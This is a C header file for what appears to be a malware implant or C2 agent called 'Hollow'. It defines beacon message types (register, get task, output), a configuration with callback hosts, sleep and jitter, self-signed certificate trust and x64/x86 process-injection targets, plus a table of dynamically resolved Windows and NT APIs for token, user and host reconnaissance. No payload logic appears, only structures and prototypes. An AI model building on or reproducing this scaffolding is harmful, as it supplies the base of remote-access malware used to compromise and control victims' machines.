#pragma once
#include "windows.h"
#include <stdio.h>
#include "nt.h"

#define DECL(x) decltype(x) * x


#ifdef _DEBUG
#define DEBUG_LOGA(msg, ...) printf(msg "\n", ##__VA_ARGS__)
#define DEBUG_LOGW(msg, ...) wprintf(msg L"\n", ##__VA_ARGS__)
#else
#define DEBUG_LOGA(msg, ...)
#define DEBUG_LOGW(msg, ...) 
#endif

#define OurProcess ((HANDLE)(LONG_PTR)-1)
#define TO_DWORD(x) ((DWORD)(ULONG_PTR)(x))
#define MSG_REGISTER 1
#define MSG_GET_TASK 2
#define MSG_OUTPUT 3

extern PBYTE  recvBuf;
extern SIZE_T recvCap;
extern SIZE_T recvLen;



typedef struct {
    WCHAR host[256];
    INT32 port;
    BOOL isHttps;
    BOOL TrustSelfSigned;
}Hosts;

typedef struct {
    WCHAR Path[124];
}Paths;

typedef struct {
    struct _net {
        INT32 TotalCallbacks;
        Hosts hosts[3];
        INT32 TotalURIs;
        Paths paths[3];
        WCHAR Headers[542];
        BOOL isHttps;
        BOOL TrustSelfSigned;
    }net;

    INT32 AgentID;
    INT32 Sleep;
    INT32 Jitter;

    struct _inject {
        CHAR InjectTox64[MAX_PATH];
        CHAR InjectTox86[MAX_PATH];
    }inject;
}Config;

typedef struct {
    struct _MODULES {
        HMODULE k32;
        HMODULE ntdll;
        HMODULE winhttp;
        HMODULE advapi;
    } Modules;

    struct _WINAPIS {
        DECL(GetModuleFileNameA);
        DECL(GetUserNameA);
        DECL(GetComputerNameExA);
        DECL(GetTickCount);
        DECL(CloseHandle);
        DECL(LoadLibraryA);
        DECL(LocalAlloc);
        DECL(LocalFree);
        DECL(LocalReAlloc);
        DECL(GetProcAddress);
        DECL(MoveFileA);
        DECL(GetLastError);
        DECL(CreateFileA);
        DECL(ReadFile);
        DECL(SetCurrentDirectoryA);
        DECL(GetCurrentDirectoryA);
    } Win32;

    struct _NTAPIS {
        DECL(NtOpenProcessToken);
        DECL(NtQueryInformationToken);
        DECL(RtlGetNtVersionNumbers);
        DECL(RtlRandomEx);
        DECL(NtQueryInformationProcess);
    } ntapi;

    Config* config;

}Hollow;

extern Hollow* hollow;


void HollowMain();
BOOL HollowInit();
BOOL RegisterAgent();
BOOL ParseConfig();
BOOL Checkin();
